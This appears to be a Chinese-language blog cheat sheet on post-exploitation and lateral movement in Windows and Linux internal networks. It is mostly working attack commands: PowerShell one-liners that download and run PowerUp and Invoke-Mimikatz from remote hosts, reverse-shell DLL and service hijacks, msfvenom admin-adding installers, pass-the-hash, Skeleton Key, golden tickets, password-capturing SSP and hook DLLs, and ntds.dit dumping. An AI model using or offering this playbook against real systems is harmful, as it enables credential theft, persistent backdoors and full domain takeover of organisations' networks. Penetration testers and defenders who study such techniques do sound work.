<p>
	<span style="color:#DAA520;"><strong>在内网横向与后渗透中，也会有一些点比较蛋疼，而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买更多的去。</strong></span>
</p>

<p>换而言之，无论做什么都需要积累。
在这篇文章中，鄙人将根据个人库存和网上参考资料做一些总结。</p>

<p>还是那句话，学无止境。我在以后还会做一些引用和补充，希望能提升自我和帮助有缘人。</p>

<h3 id="取得突破口">取得突破口</h3>

<p>在外网进入内网时，我们可能需要一个突破口，可能会存在以下几种情况：</p>

<ul>
  <li>通过SQL注入获取shell。</li>
  <li>通过命令执行获取shell。</li>
  <li>通过前后台上传恶意脚本直接获取webshell</li>
  <li>通过上传解析进行命令执行（csv、xml和shtml等）。</li>
  <li>通过未授权代理和弱/默认口令VPN获取入口。</li>
  <li>通过CSRF写shell。</li>
  <li>通过XSS作为代理，探测内网。</li>
  <li>钓鱼获得shell。</li>
</ul>

<h3 id="提取信息">提取信息</h3>

<h5 id="windows信息提取">Windows信息提取</h5>

<p>查看基本信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>set | systeminfo (环境变量及补丁信息)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

#(已知的主机名/是否开启默认共享/有无特殊服务)
#此处可以加上 /domain
net users | net view | net share | net start |net group 

#查看加入到域内的所有计算机名
net group "domain computers" /domain 

#查看域控制器
net group "domain controllers" /domain 

#查看指定用户
net user hacker /domain

#获得域密码策略设置，密码长短，错误锁定等信息
net accounts /domain 


route print 查看路由
arp -A 查看路由表

netstat -ano | tasklist /svc (查看进程所开端口)

query user (当前在线的用户状态)

schtasks /query /fo LIST /v 查看计划任务

net user administrator
(查看最近更改密码时间，有可能只是在原密码的基础上做了简单变换, 比如把xxx@2016换成xxx@2017)

netsh firewall show state | netsh firewall show config | netsh advfirewall firewall show rule name=all (cmd下查看防火墙配置)

手动到处翻翻翻：
txt/doc/xls/ppt

查询含有特定文件名和内容的文件：
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

注册表里查询：
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

#能得到部分工作站和域敏感信息
net config workstation

#有正确返回则为域用户
net time /domain


</code></pre>
</div>
<p>枚举提权：</p>

<p>一般是通过脚本枚举补丁，然后输出MS-***，市面上工具比较杂，这里不一一列举。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

https://github.com/GDSSecurity/Windows-Exploit-Suggester

</code></pre>
</div>

<h5 id="linux信息提取">Linux信息提取</h5>

<p>查看基本信息：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ps auxfww (查看进程详细信息)
netstat -tlnp (所有监听的TCP端口)
netstat -antp | ss -antp (所有活动的TCP连接, 分析哪些IP与当前主机有关联)
cat /etc/issue /etc/*release /proc/version (系统版本信息)
cat /etc/passwd (查看用户配置, 哪些用户可以登陆系统)
cat /etc/hosts (主机名解析配置, 一般这里的IP都是跟当前主机关联度比较高的)
cat /etc/resolv.conf (查看DNS服务器IP, 内网DNS服务器存在域传输漏洞的可能性较高)
id; uname -a; hostname; w; who; lastlog
</code></pre>
</div>
<p>查看敏感信息【也用于应急】：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cat /root/.bash_history | grep -Ei -C 2 'ssh|mysql|ftp|scp|su|root|passwd' (过滤历史命令记录中的敏感关键字,显示上下各两行)
loacte passwd; locate shadow; locate config.*(properties等配置文件后缀); locate .bash_history; locate .mysql_history; locate authorized_keys
find / -perm +6000 -ls 2&gt;/dev/null | grep -v proc (查找具有SUID/SGID权限的文件和目录)
find / -writable -ls 2&gt;/dev/null | grep -v proc (查找对当前用户具有写权限的文件和目录)
cat /etc/crontab (计划任务中的执行脚本是否有修改权限)
sudo -l (查看当前用户具有哪些sudo权限)
sudo -V (某些版本的sudo存在提权漏洞)
ls -latr /etc/ (查看哪些配置文件最近被修改过)
ls -l /etc/shadow* (查看shadow文件是否有备份, 权限配置是否正确)
cat /etc/security/opasswd (保存了曾经使用过的密码hash)
</code></pre>
</div>

<p>内核提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>CentOS 2.6.32 (2013年之前)
https://www.exploit-db.com/exploits/25444/
CVE-2010-3847 (RHEL5版本)
https://www.nigesb.com/cve-2010-3847-exp-centos.html
https://www.exploit-db.com/exploits/25444/
</code></pre>
</div>

<p>枚举提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>searchsploit (本地搜索漏洞库)
linuxprivchecker.py (自动检测提权漏洞的脚本)
</code></pre>
</div>

<h5 id="密码获取">密码获取</h5>

<p>注册表读取自动登陆帐户密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>(cmd) reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
(msf) post/windows/gather/credentials/windows_autologin
</code></pre>
</div>

<p>powershell篇：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>1.Empire 【综合渗透工具，类似于msf】
可以生成木马，信息收集，提权，横向渗透以及后门
https://github.com/EmpireProject/Empire.git

2.PowerUp 提权神器
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://192.168.31.247/PowerUp.ps1');Invoke-AllChecks”
powershell -exec bypass -Command "&amp; {Import-Module .PowerUp.ps1; Invoke-AllChecks}"

3.PowerView 域渗透神器
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

</code></pre>
</div>

<p>powershell读取系统密码【示例，需要xp和2003以上的系统才自带powershell】：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe -exec bypass -Command "&amp; {Import-Module .\powerview.ps1;Invoke-UserHunter}"
powershell===&gt;Import-Module .\powerview.ps1 ===&gt;Invoke-UserHunter
</code></pre>
</div>

<p>导出系统密码或者hash,在导出域hash部分有详细介绍：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter/mimikatz/pwdump7/wce/Getpwd_k8/QuarksPwDump
https://github.com/gentilkiwi/mimikatz/
</code></pre>
</div>

<p>重启记录密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>更新KB2871997补丁后，可禁用Wdigest Auth强制系统的内存不保存明文口令。这时需要修改注册表键值，启用Wdigest Auth，自动锁屏，等待用户重新登录判断当前锁屏状态，用户解锁登录后立即导出明文口令：
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
</code></pre>
</div>

<p>Meterpreter获取所有用户的hash：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1.msf有两个模块可以使用，一个是hashdump，此模块只能导出本地的hash，大家测试就可以知道了，另外一个是smart_hashdump,此模块可以用来导出域用户的hash。
</code></pre>
</div>
<p>powershell有可以直接导出的模块，大家自行尝试一下。</p>

<p>win2012修改注册表，再次登录可获取密码：</p>
<blockquote>
  <p>需要HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的”UseLogonCredential”设置为1，类型为DWORD 32才可以，然后下次用户再登录，就能记录到明文密码了。</p>
</blockquote>

<blockquote>
  <p>在不存在该字段时，添加UseLogonCredential就行。</p>
</blockquote>

<p>导出部分重要第三方软件密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>k8getteamviewpwd
http://qqhack8.blog.163.com/blog/static/11414798520156543210624/

浏览器密码读取（多种）

多种读取密码工具
http://www.nirsoft.net/

Teamview读取密码工具【吐司版】

winscp还原明文密码
post/windows/gather/credentials/winscp

Get-GPPPassword(PS)
获取AD域中SYSVOL和组策略首选项中的密码
https://xianzhi.aliyun.com/forum/topic/1653/

Unattended Installs
自动安装允许程序残留xml，全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中。除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件：

C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\

MSF module：post/windows/gather/enum_unattend
</code></pre>
</div>

<p>LAPS获取密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://wooyun.jozxing.cc/static/drops/tips-10496.html
</code></pre>
</div>

<p>在线破解hash网站：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.objectif-securite.ch/en/ophcrack.php
http://www.cmd5.com
这尼玛太少了，谁帮我加点。

</code></pre>
</div>
<p>离线破解：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ophcrack/hashcat/john the ripper

hashcat 可以组合字典破解，还可以根据规则处理字典
https://hashcat.net/wiki/doku.php?id=mask_attack
/usr/share/hashcat/rules/ 目录存放了默认的规则文件。
</code></pre>
</div>

<h3 id="win提升权限">Win提升权限</h3>

<p>检查是否存在可以提权的第三方应用：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>serv-u/filezilla/flashfxp/winscp/mysql/mssql/radmin
</code></pre>
</div>

<p>服务配置不当提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>有的服务以system权限运行, 但是权限配置不当, 导致普通用户可以通过 sc config 修改程序路径。

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

查看权限
#这个也行
icacls "C:\Program Files (x86)\Privacyware"

sc qc Spooler【某示例程序】
accesschk.exe -ucqv Spooler
accesschk.exe -ucqv *

===================================
#正题在下面
accesschk.exe -uwcqv "Authenticated Users" *
#结果查出来是upnphost
accesschk.exe -ucqv upnphost

sc qc upnphost
sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
#弹出shell

#测试是否everyone有权限
icacls "C:Program Files\Program Folder\A Subfolder\OmniServers.exe"
#Install-ServiceBinary模块，通过Write-ServiceBinary写一个C#的服务用来添加用户:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'OmniServers'-UserName shuteer -Password Password123!


#提权成功以后我们需要清除入侵的痕迹，把所有的状态恢复到最初的状态，可以使用如下命令恢复：
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Restore-ServiceBinary -ServiceName 'OmniServers'

#漏洞利用原理：该漏洞产生的原因是因为用户开启了windows installer特权安装功能:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1'); Get-RegistryAlwaysInstallElevated
#检测注册表是否设置，得到true【好像False也能继续】
运行Write-UserAddMSI模块，运行后生成文件UserAdd.msi
#普通用户运行：
msiexec /q /i UserAdd.msi
</code></pre>
</div>

<p>劫持提权:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>有的服务程序路径包含空格, 且路径没有被引号包含, 利用Windows寻找可执行文件的顺序, 劫持启动自定义程序。
http://www.greyhathacker.net/?p=738
http://www.freebuf.com/vuls/87463.html

echo %path%
accesschk.exe -dqv "C:\Python27"
cacls "C:\Python27"

msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &gt; 
/root/Desktop/evil.dll
copy evil.dll C:\Python27\wlbsctrl.dll
#重启生效

#也可以看看计划任务里有没有可疑目录
#比如出现了
#Task To Run:        E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out  E:\GrabLogs\Logs\log.txt
accesschk.exe -dqv "E:\GrabLogs"
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
exe &gt; /root/Desktop/evil-tftp.exe
copy evil-tftp.exe E:\GrabLogs\tftp.exe

#命令行下第一次运行需要同意一个许可，如果不想出现那个提示窗口，则可以执行：
accesschk.exe /accepteula

#找弱权限目录
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

##找弱权限文件
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*


SC创建服务执行
1、系统权限(其中test为服务名)
sc \\DC1 create test binpath= c:\cmd.exe
sc \\DC1 start test
sc \\DC1 delete test

2.指定用户权限启动
sc \\DC1 create test binpath = "c:\1.exe" obj= "centoso\administrator" passwrod= test
sc \\DC1 start test

</code></pre>
</div>

<p>AlwaysInstallElevated：</p>

<blockquote>
  <p>AlwaysInstallElevated是微软允许非授权用户以SYSTEM权限运行安装文件(MSI)的一种设置。然而，给予用于这种权利会存在一定的安全隐患，因为如果这样做下面两个注册表的值会被置为”1”。</p>
</blockquote>

<p>查询命令如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre>
</div>
<p>Note：如果这条命令出错类似于：”The system was unable to find the specified registry key or value”，这可能是组策略里AlwaysInstallElevated没有被定义，因此不存在相关联的注册表项。</p>

<p>现在我们假设AlwaysInstallElevated已经启用了，我们可以利用MSFVenom工具来生成一个在目标机器上增加管理员用户的MSI安装文件：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
</code></pre>
</div>
<p>当我们在目标机器上加载了新生成的MSI文件后，我们可以使用Windows命令行工具Msiexec进行安装：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
</code></pre>
</div>
<p>Note:使用MSFVenom创建MSI文件时使用了always_install_elevated模块，那么在安装过程中会失败。这是因为操作系统会阻止未注册的安装。</p>

<p>下面的模块效果相同：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>exploit/windows/local/always_install_elevated
</code></pre>
</div>

<p>使用Veil生成免杀payload：</p>

<blockquote>
  <p>这个按照提示走就行了，具体的查查资料。</p>
</blockquote>

<p>msf在meterpreter下的bypassuac尝试：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>use exploit/windows/local/bypassuac_eventvwr
#seach bypassuac
</code></pre>
</div>

<p>Meterpreter的post模块使用：</p>

<blockquote>
  <p>全都是后渗透模块，search post可得部分，在获取一定权限的session后，直接run即可。</p>
</blockquote>

<p>迁移进程获得权限：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>PS 查看域管理所在的进程
Migrate pid注入进程
</code></pre>
</div>

<p>从IPC$到域控【尼玛这得多好的运气】：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>继续经典的IPC$到域控

Meterpreter下面shell

Net use \\域控ip\c$

Net time \\域控ip

Copy bat.bat \\域控ip\c$

At \\域控ip time c:\bat.bat

通往成功的路不只有一条，添加域管账户

Net user demo demo /ad /domain

Net group “domain admins” demo /ad /domain

到了此刻，我们已经拥有域管权限了
</code></pre>
</div>

<h3 id="开启代理">开启代理</h3>

<p>获取10.10.1.1/24网段访问权限。
ssh动态转发 (本地开启socks代理)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ssh -qTfNCD 0.0.0.0:8081 root@10.10.1.110 (在10.10.2.120上执行)
</code></pre>
</div>

<p>外网机器IP可访问内网机3306：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ssh -L 3306:外网机器ip:3306   user@隔离机器IP    -N
</code></pre>
</div>

<p>ssh静态转发 (通过本机10.10.3.130的20000端口可以获得10.10.1.1/24网段访问权限)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ssh -qTfNCL 0.0.0.0:20000:10.10.2.120:8081 root@10.10.3.130
</code></pre>
</div>
<p>(通过10.10.3.130,将10.10.2.120的8081端口转发到本地20000端口)</p>

<p>metasploit:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>portfwd add -l 4445 -p 445 -r 10.10.10.111 (把内网另外一台主机的445端口转到在msf的4445端口)

msf开启socks4代理, 并添加内网路由, msf内部模块可直接通过session路由访问内网, 外部程序可通过socks4代理访问内网。

use auxiliary/server/socks4a | run (msf开启socks4代理, 默认是1080端口)
msf exploit(handler) &gt; sessions
Active sessions
===============
  Id  Type                     Information                                      Connection
  --  ----                     -----------                                      ----------
  1   meterpreter x86/windows  MICROSOF-CA98DC\Administrator @ MICROSOF-CA98DC  192.168.71.196:58308 -&gt; 192.168.71.167:443 (192.168.71.167)
msf exploit(handler) &gt; route add 192.168.71.196/24 1
[*] Route added
msf exploit(handler) &gt; route
IPv4 Active Routing Table
=========================
  Subnet             Netmask            Gateway
  ------             -------            -------
  192.168.71.196     255.255.255.0      Session 1
[*] There are currently no IPv6 routes defined。
msf exploit(handler) &gt;
</code></pre>
</div>

<h3 id="横向执行命令">横向执行命令</h3>

<div class="highlighter-rouge"><pre class="highlight"><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]

(python版的psexec) psexec.py administrator:123456@192.168.71.165 -port 445

at \\192.168.200.100 15:00 c:\hack.bat

psexec \\192.168.1.2 c:\hack.bat【执行单条命令】
psexec \192.168.200.100 cmd【半交互shell】
</code></pre>
</div>

<p>上面是提供账号密码的情况，如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入【传递】，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password【半交互shell】
cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  "command"【执行单条命令】
</code></pre>
</div>
<p>wce注入hash后进行命令执行</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wce -s [hash] 
cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1
</code></pre>
</div>

<p>运行时间长的命令时，如ping,systeminfo之类的，记得加上-wait5000或者更久的时间选项。
运行nc反弹或者木马等不需要输出结果、同时需要一直运行的程序时，一定要加上-persist选项，不然你就只能去taskkill远程结束进程了。</p>

<p>使用NTLM hash远程连接：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>以管理员权限运行：
mimikatz "privilege::debug" "sekurlsa::pth /user:a /domain:test.local /ntlm:efa85b42d77dc2fdbdbdb767792b0a11"
dir \\192.168.40.132\c$
</code></pre>
</div>

<p>注:
虽然”sekurlsa::pth”在mimikatz中被称之为”Pass The Hash”,但是其已经超越了以前的”Pass The Hash”，部分人将其命名为”Overpass-the-hash”，也就是”Pass-the-key”</p>

<p>使用aes key远程连接（kb2871997 Installed）：
获取aes key 的mimikatz命令为：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::ekeys
</code></pre>
</div>

<p>无法复制时，开启日志记录功能后会把输出回显的内容保存在同级目录下的mimikatz.log中：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log privilege::debug sekurlsa::ekeys
</code></pre>
</div>

<p>以管理员权限运行：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c" 
privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes128:8cce86e4b0630f07fcf5f2110068c421" 

dir \\WIN-8VVLRPIAJB0\c$
</code></pre>
</div>

<p>注意：</p>

<p>这里dir要使用主机名 而不是ip，不然会提示用户名或密码错误。</p>

<h3 id="保持权限">保持权限</h3>

<p>这块儿东西太多，只能简单提下，有机会单独撰文分析。</p>

<h5 id="linux后门">Linux后门</h5>
<p>webshell，rootkit，改普通用户权限，在某些服务和软件上做手脚，添加ssh-key，添加键盘钩子。</p>

<h5 id="win后门">Win后门</h5>
<p>webshell，劫持dll，劫持在login界面能触发的软件，添加隐藏用户，克隆用户，加远控，powershel脚本，各种票据，开盘符共享，在某些服务和软件上做手脚，添加键盘钩子。</p>

<h5 id="维持域控权限">维持域控权限</h5>

<p>1.直接获取lsass.exe（SSP）中的明文密码：
修改域控注册表位置，在Security Packages下添加mimilib.dll：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\
</code></pre>
</div>
<p>域控重启后在c:\windows\system32可看到新生成的文件kiwissp.log，里面记录了密码。
mimikatz同时还支持通过内存更新ssp，这样就不需要重启再获取账户信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::memssp
</code></pre>
</div>

<p>2.Hook PasswordChangeNotify无痕，不需要重启和修改注册表，生成dll注入的powershell脚本：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/clymb3r/Misc-Windows-Hacking/blob/master/HookPasswordChange/Debug/HookPasswordReset.dll

https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
在代码尾部添加如下代码：
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass
并命名为HookPasswordChangeNotify.ps1

上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll，管理员权限执行：
PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
</code></pre>
</div>
<p>域控更新密码后（手动），在C:\Windows\Temp下可以找到passwords.txt，其中记录了新修改的密码。</p>

<p>3.Skeleton Key（不需要域控重启）
正常登录域控：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>net use \\WIN-8VVLRPIAJB0.test.local 12345678!Q /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
</code></pre>
</div>
<p>mimikatz在域控上安装Skeleton Key：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::skeleton
</code></pre>
</div>
<p>使用Skeleton Key登录，mimikatz的默认Skeleton Key设置为mimikatz，权限不变，只是万能密码：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>net use */del /y
net use \\WIN-8VVLRPIAJB0.test.local mimikatz /user:a@test.local
dir \\WIN-8VVLRPIAJB0.test.local\c$
</code></pre>
</div>
<p>4.绕过LSA保护策略，似乎需要自带的mimidrv.sys文件：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
</code></pre>
</div>
<p>本地组策略禁用一些重要组件后，使用mimikatz绕过：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
misc::cmd
misc::regedit
misc::taskmgr
</code></pre>
</div>

<h3 id="扫描内网">扫描内网</h3>

<h5 id="漏洞扫描">漏洞扫描</h5>

<p>漏洞扫描跟外网不同的是，流量需要控制，但是多数情况下是不会有WAF和防火墙的。</p>

<p>当然，在大一点的内网，如果没有流量监控和分析一般是可能性比较小的。</p>

<p>使用脚本漏洞扫描【如awvs】和路径爆破【如御剑】，操作大体与外网扫描相似。</p>

<p>其实国人也写过不少优秀的自研扫描器，里面有部分是内网专用的：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://github.com/We5ter/Scanners-Box
</code></pre>
</div>

<h5 id="信息探测">信息探测</h5>

<p>这类漏扫一般都会提供，可能会探测特定的服务、探测Title等等，但一些专有用途的刺探脚本也许会优于综合型漏扫。</p>

<h5 id="服务探测">服务探测</h5>

<p>服务探测主要使用nmap、masscan一类的端口扫描器，他们存有banner可以和数据库里存储的服务版本进行对比，从而给我们输出相关信息。</p>

<h5 id="口令爆破">口令爆破</h5>

<p>一般像hscan【windows】或者hydra【跨平台】的会比较合适，如果能做sock或者http/https代理的话，如Nmap/MSF里script的效果也是不错的。
至于国内传统厂商出的一些扫描器则显得比较笨拙，做自检还勉强，部署也相当麻烦。</p>

<h3 id="攻击域控">攻击域控</h3>

<h5 id="导出域内用户hash">导出域内用户hash</h5>

<blockquote>
  <p>1.gethashes.exe $local</p>
</blockquote>

<blockquote>
  <p>2.mimikatz</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::logonpasswords
获得域控权限、导出所有用户口令、维持域控权限：

附上一套完整打法：
http://blog.csdn.net/pyphrb/article/details/52051321
攻击域控，获得权限

使用ms14-068漏洞
ms14-068.exe -u -p -s -d 【这里参数值省略】

生成伪造缓存test.ccache: 
导入伪造缓存: mimikatz：
kerberos::ptc test.ccache

登陆：
net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

导出域
（1）直接获取内存口令 mimikatz：
privilege::debug
sekurlsa::logonpasswords
（2）通过内存文件获取口令 使用procdump导出lsass.dmp mimikatz：

sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
（3）通过powershell加载mimikatz获取口令

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
（4）导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份（之前文章有介绍） mimikatz：

lsadump::sam SYSTEM.hiv SAM.hiv持域控权限

（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test

4、维持域控权限
（1）Skeleton Key mimikatz：

privilege::debug
misc::skeleton
万能钥匙，可使用任意用户登陆域控

net use \\A-635ECAEE64804.TEST.LOCAL mimikatz /user：test
这里写图片描述 
（2）golden ticket mimikatz：

lsadump::lsa /patch 
获取krbtgt的ntlmhash

生成万能票据： mimikatz：

kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi
导入票据： mimikatz：

kerberos::ptt test.kirbi
登陆域控：

net use \\A-635ECAEE64804.TEST.LOCAL
dir \\A-635ECAEE64804.TEST.LOCAL\c$

（3）Pass-The-Hash mimikatz：

sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a

</code></pre>
</div>

<blockquote>
  <p>3.pwdump【直接运行Pwdump7即可】</p>
</blockquote>

<blockquote>
  <p>4.vssown.vbs + libesedb + NtdsXtract【太耗时】
http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html</p>
</blockquote>

<blockquote>
  <p>5.ShadowCopy+QuarksPwDump【参考内容见下】：
http://blog.csdn.net/citelao/article/details/50948103</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>（1）使用ShadowCopy的命令行版，编写bat实现拷贝ntds.dit至当前目录

setlocal
if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
"%~dp0vsshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
参考链接： http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx

（2）使用QuarksPwDump直接读取信息并将结果导出至文件，先执行

esentutl /p /o ntds.dit
修复复制出来的数据库

QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt
读取并导出。

注：实际使用时ntds.dit和log.txt需要加绝对路径

Tips：

QuarksPwDump.exe：Dump various types of Windows credentials without injecting in any process.
源码下载链接，vs2010直接编译即可
https://github.com/quarkslab/quarkspwdump
</code></pre>
</div>

<blockquote>
  <p>6.ntdsutil.exe + QuarksPwDump.exe【生成ntds.dit，再读取hash】</p>
</blockquote>

<div class="highlighter-rouge"><pre class="highlight"><code>#ntdsutil
#snapshot
#activate instance ntds
#create
#mount {GUID}
#copy c:\MOUNT_POINT\WINDOWS\NTDS\NTDS.dit c:\NTDS_saved.dit
#unmount {GUID}
#delete {GUID}
#quit
#quit

#QuarksPwDump.exe --dump-hash-domain --ntds-file c:\ntds.dit
</code></pre>
</div>

<blockquote>
  <p>7.powershell【比如上文提到的Invoke-mimikatz脚本】</p>
</blockquote>

<h5 id="hash传递">hash传递</h5>

<p>受限管理员模式顾名思义,只对管理员组有效.所以如果你获取到的用户属于远程桌面用户组,那么是无法通过hash登录的.会提示错误。</p>

<p>mimikatz:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a
</code></pre>
</div>

<p>MSF:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>use exploit/windows/smb/psexec

</code></pre>
</div>

<p>Keimpx：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Keimpx -t ip -c ~/hash.txt -v 2
</code></pre>
</div>

<p>PTH套件：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Pth-winexe可以借助哈希执行程序得到一个cmdshell
Pth-winexe - U ... //ip cmd

参考：
http://blog.csdn.net/the__apollo/article/details/70474935

</code></pre>
</div>

<p>WCE：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wce -s ...
</code></pre>
</div>

<p>psexec/wmiexec：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>前面有提到用法，这里就不单独讲了。
</code></pre>
</div>

